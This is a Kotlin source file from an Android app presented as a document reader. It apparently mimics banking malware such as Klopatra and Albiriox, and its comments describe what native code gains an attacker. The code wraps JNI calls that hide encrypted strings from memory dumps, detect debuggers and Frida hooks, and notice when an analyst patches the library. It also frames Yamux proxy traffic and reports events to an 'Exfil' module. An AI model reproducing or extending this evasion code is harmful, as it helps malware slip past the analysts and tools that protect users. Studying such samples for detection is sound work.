package com.docreader.lite.reader.engine

import com.docreader.lite.reader.Exfil

/**
 * Native protection bridge — Kotlin ↔ C/C++ via JNI.
 *
 * Real banker (Klopatra): Virbox-protected native library.
 * Albiriox: custom ARMv8 VM wrapping critical logic.
 *
 * What native code buys attacker:
 *   - jadx cannot decompile .so files (needs IDA/Ghidra)
 *   - MobSF/apktool skip .so analysis
 *   - String encryption in C = no Java heap exposure
 *   - ptrace self-attach = native-level debugger detection
 *   - PLT hook detection = anti-Frida at function-entry level
 *   - Yamux framing at C speed for proxy throughput
 *
 * System.loadLibrary("docreader_native") loads libdocreader_native.so
 * from APK's lib/<abi>/ directory.
 */
object NativeRuntime {

    private var loaded = false

    fun init() {
        if (loaded) return
        try {
            System.loadLibrary("docreader_native")
            loaded = true
        } catch (e: UnsatisfiedLinkError) {
            // .so not present or ABI mismatch — degrade gracefully
            Exfil.event("native_load_failed", "error" to (e.message ?: ""))
        }
    }

    /**
     * Decrypt string using native C-level XOR.
     * Key material never touches Java heap → immune to Java-level memory dump.
     */
    fun decrypt(encoded: ByteArray): String? {
        if (!loaded) return null
        return try {
            nativeDecrypt(encoded)
        } catch (_: Exception) { null }
    }

    /**
     * Run native anti-analysis checks.
     * Returns bitmask: bit 0 = ptrace debugger, bit 1 = Frida PLT hooks,
     * bit 2 = suspicious /proc/self/maps entries.
     */
    fun antiAnalysisCheck(): Int {
        if (!loaded) return 0
        return try {
            nativeAntiAnalysis()
        } catch (_: Exception) { 0 }
    }

    /**
     * Check .so file integrity via CRC32.
     * If analyst patched the .so (NOP out checks), CRC mismatches.
     */
    fun checkIntegrity(soPath: String): Int {
        if (!loaded) return 0
        return try {
            nativeSoIntegrity(soPath)
        } catch (_: Exception) { 0 }
    }

    /**
     * Encode Yamux frame — native C for performance.
     * Type: 0=data, 1=window_update, 2=ping, 3=go_away
     */
    fun encodeYamux(type: Int, flags: Int, streamId: Int, payload: ByteArray?): ByteArray? {
        if (!loaded) return null
        return try {
            yamuxEncode(type, flags, streamId, payload ?: ByteArray(0))
        } catch (_: Exception) { null }
    }

    /**
     * Decode Yamux frame header.
     * Returns [type, flags, streamId, payloadOffset, payloadLength]
     */
    fun decodeYamux(frame: ByteArray): IntArray? {
        if (!loaded) return null
        return try {
            yamuxDecode(frame)
        } catch (_: Exception) { null }
    }

    // ─── JNI external declarations ─────────────────────────────────────
    private external fun nativeDecrypt(encoded: ByteArray): String
    private external fun nativeAntiAnalysis(): Int
    private external fun nativeSoIntegrity(soPath: String): Int
    private external fun yamuxEncode(type: Int, flags: Int, streamId: Int, payload: ByteArray): ByteArray
    private external fun yamuxDecode(frame: ByteArray): IntArray
}
